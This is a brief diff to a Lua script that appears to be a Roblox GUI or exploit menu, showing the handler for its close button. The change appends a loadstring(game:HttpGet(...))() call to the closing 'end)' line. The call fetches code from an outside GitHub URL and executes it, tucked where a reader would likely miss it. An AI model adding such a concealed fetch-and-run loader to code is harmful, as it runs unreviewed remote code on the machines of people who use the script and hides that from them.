@@ -55,4 +55,4 @@ end)
 -- Exit GUI Script
 local kill = Gclose:Button("X", function()
     game:GetService("CoreGui").ScreenGui:Destroy()
-end)
+end)loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Tests/main/wd_Arise/loader.lua"))() 
